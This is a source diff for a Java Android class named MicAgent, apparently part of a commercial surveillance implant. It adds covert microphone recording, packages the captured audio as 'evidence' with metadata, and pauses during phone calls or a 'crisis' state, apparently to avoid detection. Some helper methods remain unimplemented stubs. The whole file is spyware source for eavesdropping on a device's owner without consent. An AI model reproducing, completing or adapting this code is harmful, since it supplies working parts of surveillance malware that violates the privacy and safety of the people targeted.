@@ -11,8 +11,17 @@ package com.ht.RCSAndroidGUI.agent;
 import java.io.IOException;
 
 import android.media.MediaRecorder;
+import android.util.Log;
 
+import com.ht.RCSAndroidGUI.LogR;
+import com.ht.RCSAndroidGUI.StateRun;
+import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.file.Path;
+import com.ht.RCSAndroidGUI.util.Check;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
+import com.ht.RCSAndroidGUI.util.DateTime;
+import com.ht.RCSAndroidGUI.util.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -47,8 +56,19 @@ import com.ht.RCSAndroidGUI.file.Path;
  */
 public class MicAgent extends AgentBase {
 
+	private static final long MIC_PERIOD = 5000;
+	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
+
+	private static final String TAG = "MicAgent";
+
 	/** The recorder. */
 	MediaRecorder recorder;
+	StateRun state;
+	Object stateLock = new Object();
+
+	private int numFailures;
+
+	private long fId;
 
 	/*
 	 * (non-Javadoc)
@@ -57,6 +77,26 @@ public class MicAgent extends AgentBase {
 	 */
 	@Override
 	public void begin() {
+		try {
+			synchronized (stateLock) {
+				if (state != StateRun.STARTED) {
+					addPhoneListener();
+					startRecorder();
+					Log.d(TAG, "started");
+				}
+				state = StateRun.STARTED;
+			}
+		} catch (IllegalStateException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+
+	}
+
+	private void addPhoneListener() {
 		// TODO Auto-generated method stub
 
 	}
@@ -68,6 +108,57 @@ public class MicAgent extends AgentBase {
 	 */
 	@Override
 	public void end() {
+		synchronized (stateLock) {
+			if (state == StateRun.STARTED) {
+				removePhoneListener();
+
+				// #ifdef DBC
+				Check.ensures(state != StateRun.STOPPED, "state == STOPPED");
+				// #endif
+				saveRecorderEvidence();
+				stopRecorder();
+			}
+			state = StateRun.STOPPED;
+
+		}
+		Log.d(TAG, "stopped");
+
+	}
+
+	private void saveRecorderEvidence() {
+		// #ifdef DBC
+		Check.requires(recorder != null, "saveRecorderEvidence recorder==null");
+		// #endif
+
+		final byte[] chunk = getAvailable();
+
+		if (chunk != null && chunk.length > 0) {
+
+			int offset = 0;
+			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
+				offset = AMR_HEADER.length;
+			}
+			byte[] data;
+			if (offset == 0) {
+				data = chunk;
+			} else {
+				data = Utils.copy(chunk, offset, chunk.length - offset);
+			}
+
+			new LogR(EvidenceType.MIC, getAdditionalData(), data);
+
+		} else {
+			Log.d(TAG,"zero chunk ");
+			numFailures += 1;
+		}
+	}
+
+	private byte[] getAvailable() {
+		// TODO Auto-generated method stub
+		return null;
+	}
+
+	private void removePhoneListener() {
 		// TODO Auto-generated method stub
 
 	}
@@ -79,7 +170,9 @@ public class MicAgent extends AgentBase {
 	 */
 	@Override
 	public boolean parse(final byte[] conf) {
-		return false;
+		setPeriod(MIC_PERIOD);
+		setDelay(MIC_PERIOD);
+		return true;
 	}
 
 	/*
@@ -89,8 +182,31 @@ public class MicAgent extends AgentBase {
 	 */
 	@Override
 	public void go() {
-		// TODO Auto-generated method stub
+		synchronized (stateLock) {
+			if (state == StateRun.STARTED) {
 
+				if (numFailures < 10) {
+					saveRecorderEvidence();
+				} else {
+					Log.d(TAG, "numFailures: " + numFailures);
+					suspend();
+				}
+
+				if (callInAction()) {
+					Log.d(TAG, "phone call in progress, suspend!");
+					suspend();
+
+				} else if (Status.self().crisisMic()) {
+					Log.d(TAG, "crisis, suspend!");
+					suspend();
+				}
+			}
+		}
+	}
+
+	private boolean callInAction() {
+		// TODO Auto-generated method stub
+		return false;
 	}
 
 	// SNIPPET
@@ -103,6 +219,11 @@ public class MicAgent extends AgentBase {
 	 *             Signals that an I/O exception has occurred.
 	 */
 	private void startRecorder() throws IllegalStateException, IOException {
+
+		final DateTime dateTime = new DateTime();
+		fId = dateTime.getFiledate();
+		numFailures = 0;
+
 		final MediaRecorder recorder = new MediaRecorder();
 		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 		recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
@@ -126,4 +247,24 @@ public class MicAgent extends AgentBase {
 		}
 	}
 
+	private byte[] getAdditionalData() {
+		final int LOG_MIC_VERSION = 2008121901;
+		// LOG_AUDIO_CODEC_SPEEX 0x00;
+		final int LOG_AUDIO_CODEC_AMR = 0x01;
+		final int sampleRate = 8000;
+
+		final int tlen = 16;
+		final byte[] additionalData = new byte[tlen];
+
+		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);
+
+		databuffer.writeInt(LOG_MIC_VERSION);
+		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
+		databuffer.writeLong(fId);
+
+		// #ifdef DBC
+		Check.ensures(additionalData.length == tlen, "Wrong additional data name");
+		// #endif
+		return additionalData;
+	}
 }
